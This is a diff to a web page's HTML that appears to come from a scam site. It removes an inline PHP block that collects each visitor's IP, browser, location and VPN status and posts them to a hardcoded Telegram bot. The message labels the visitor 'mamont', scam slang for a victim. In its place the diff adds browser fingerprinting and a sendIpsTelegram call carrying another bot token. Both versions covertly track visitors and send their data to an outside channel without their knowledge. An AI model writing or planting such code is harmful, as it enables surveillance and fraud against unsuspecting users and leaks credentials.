@@ -16,40 +16,10 @@
 <script src="ads/system/context.js" async=""></script>
 </head>
 <body>
-<script language="php">
-//Get the visitor's IP
-$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
-$Browser = $_SERVER['HTTP_USER_AGENT'];
-//Check if IP is a VPN (Is not always correct!)
-$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
-$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
-if ($VPNConn->connection_type === "Corporate") {
-    $VPN = "Yes";
-} else {
-    $VPN = "No";
-}
-//Set some variables
-$Country = $Details->country;
-$CountryCode = $Details->countryCode;
-$Region = $Details->regionName;
-$City = $Details->city;
-$Zip = $Details->zip;
-$Lat = $Details->lat;
-$Lon = $Details->lon;
-$WebhookName = $IP;
-$apiToken = “4334584910:AAEPmjlh84N62Lv3jGWEgOftlxxAfMhB1gs”; 
-$data = [ 
-    ‘chat_id’ => ‘6817925852’, 
-    ‘text’ => ‘Мамонт зашел на сайт
-    IP: $IP
-    Браузер: $Browser
-    Страна: $Country
-    VPN: $VPN’ 
-   ]; 
-
-$response = file_get_contents(“http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 
-</script>
-
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="fingerprintjs2/fingerprint2.js"></script>
+  <script src="logger.js"></script>
+  <script> sendIpsTelegram(7049804340:AAHb06RQ_Vkix5Q_D4BZ-BplK20ZMTMB9Dw,6817925852); </script>
 <div class="container">
 <header>
 <div id="mobile-menu" class="">
